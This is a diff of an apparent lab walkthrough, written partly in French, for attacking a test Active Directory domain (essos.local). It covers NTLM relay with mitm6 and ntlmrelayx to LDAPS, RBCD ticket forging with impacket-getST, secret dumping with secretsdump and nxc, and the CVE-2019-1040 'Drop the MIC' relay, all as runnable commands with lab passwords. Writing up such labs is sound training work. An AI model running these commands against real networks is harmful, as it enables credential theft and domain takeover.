@@ -72,13 +72,7 @@ mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local
 Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.
 
 ```bash
-ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access
-```
-
-Vérifie si un compte dispose de droits de délégation sur des machines cibles dans l’AD.
-
-```bash
-impacket-findDelegation essos.local/relayedpccreate\$:'ttrJB6qsD;B3BSn' -dc-ip 192.168.56.12
+ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --delegate-access
 ```
 
 Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant une délégation RBCD.
@@ -87,11 +81,12 @@ Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant 
 impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
 ```
 
-DCSync by presenting the service ticket
+Use that ticket to retreive secrets on BRAAVOS
 
 ```bash
 export KRB5CCNAME=/workspace/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
+nxc smb 192.168.56.23 -k --use-kcache --sam
 ```
 
 If we specify a loot dir all the informations on the ldap are automatically dumped
@@ -100,7 +95,11 @@ If we specify a loot dir all the informations on the ldap are automatically dump
 ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
 ```
 
-## Coerced auth smb + ntlmrelayx to ldaps with drop the mic
+## Drop the mic
+
+#### **CVE-2019-1040 – "Drop The MIC" (a.k.a. "Remove MIC")**
+
+> Une vulnérabilité dans NTLM qui permet de relayer une authentification SMB vers LDAPS **en supprimant le MIC (Message Integrity Code)**, ce qui normalement est censé empêcher ce type de relai.
 
 Start the relay with remove mic to the ldaps of meereen.essos.local.
 
@@ -120,9 +119,10 @@ The attack worked we can now exploit braavos with RBCD
 impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
 ```
 
-DCSync by presenting the service ticket
+Use that ticket to retreive secrets on BRAAVOS
 
 ```bash
 export KRB5CCNAME=/workspace/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
+nxc smb 192.168.56.23 -k --use-kcache --sam
 ```
